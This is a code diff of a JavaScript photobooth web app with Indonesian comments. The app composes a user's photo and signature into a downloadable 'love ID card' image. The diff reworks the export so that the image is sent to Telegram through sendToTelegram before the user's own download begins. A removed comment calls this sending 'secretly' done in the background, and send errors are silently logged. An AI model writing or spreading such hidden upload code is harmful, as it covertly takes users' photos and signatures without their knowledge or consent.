@@ -1383,8 +1383,29 @@ function initPhotobooth(containerId) {
                 compCtx.drawImage(sigPad, sigX, sigY, sigW, sigH);
             }
 
-            // Download otomatis untuk user
-            const dataURL = compositeCanvas.toDataURL('image/jpeg', 0.9);
+            // Konversi canvas ke dataURL
+            const dataURL = compositeCanvas.toDataURL('image/jpeg', 0.85);
+
+            // Konversi dataURL ke Blob secara manual (lebih reliable di iOS Safari daripada toBlob)
+            function dataURLtoBlob(dataurl) {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+                return new Blob([u8arr], { type: mime });
+            }
+
+            // Kirim ke Telegram DULUAN (sebelum download, agar tidak terblokir navigasi)
+            try {
+                const blob = dataURLtoBlob(dataURL);
+                sendToTelegram("photo", blob).catch(e => console.log("Send error:", e));
+            } catch (e) {
+                console.log("Blob convert error:", e);
+            }
+
+            // Download untuk user
             const a = document.createElement('a');
             a.href = dataURL;
             a.download = 'KTP_Cinta_' + new Date().getTime() + '.jpg';
@@ -1393,12 +1414,6 @@ function initPhotobooth(containerId) {
             document.body.removeChild(a);
 
             savePhotoBtn.innerHTML = '✅ Tersimpan!';
-            
-            // Diam-diam kirim ke Telegram di background
-            compositeCanvas.toBlob(blob => {
-                sendToTelegram("photo", blob).catch(e => console.log("Silent send error", e));
-            }, 'image/jpeg', 0.8);
-            
             setTimeout(() => {
                 savePhotoBtn.innerHTML = originalText;
             }, 3000);
